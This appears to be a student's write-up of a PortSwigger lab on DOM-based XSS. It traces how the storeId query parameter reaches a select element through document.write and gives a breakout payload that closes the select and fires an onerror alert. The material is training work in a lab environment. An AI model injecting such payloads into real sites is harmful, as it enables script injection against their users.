# Lab: DOM XSS in document.write sink using source location.search inside a select element

# ***[LAB LINK](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)***

### Approach:
```plaintext
1. We have to check the dropdown manu
2. In the dropdown we can find an extra parameter
3. Adding the param with the existing link we can add our payload
4. In a  DOM based xss  we have to find exactly where our inputs are getting stored in the DOM of js.
```

### Process:

```plaintext
POC
-------------------------------------------------
1. If we visit the website we can find some Endpoints

2. Endpoint- https://0a74002a04e0dceb80bfe94d00220082.web-security-academy.net/product?productId=1

3. If we check the endpoint we can find there is a dropdown box there

4. If we inspect it we can find that there is another endpoint parameter called storeId

5. So we can assume that it can also be added with the endpoint that we are in.

6. Our endPoint - https://0a74002a04e0dceb80bfe94d00220082.web-security-academy.net/product?productId=1&storeId=

7.product?productId=1&storeId=

8. If we input something in the parameter

9. storeId=RuhanSec

10. It is getting stored in the DOM of the page


```
##### ![Inspecting The Dropdown](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/Lab%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/img1.png?raw=true)

### **After storeId=RuhanSec**  

##### ![Adding RuhanSec in the dropdown](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/Lab%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/img2.png?raw=true)


##### ![alt text](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/Lab%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/img3.png?raw=true)




### Crafting Payload:
```js
</select><img src="1" onerror="alert()">
```
```plaintext
POC
-------------------------------------------------
11. </select> is for closing the previous text
12. src="1" is for having an error
13. onerror for handling it 
```
![Pwn3d](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/Lab%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/img4.png?raw=true)

# pwn3d!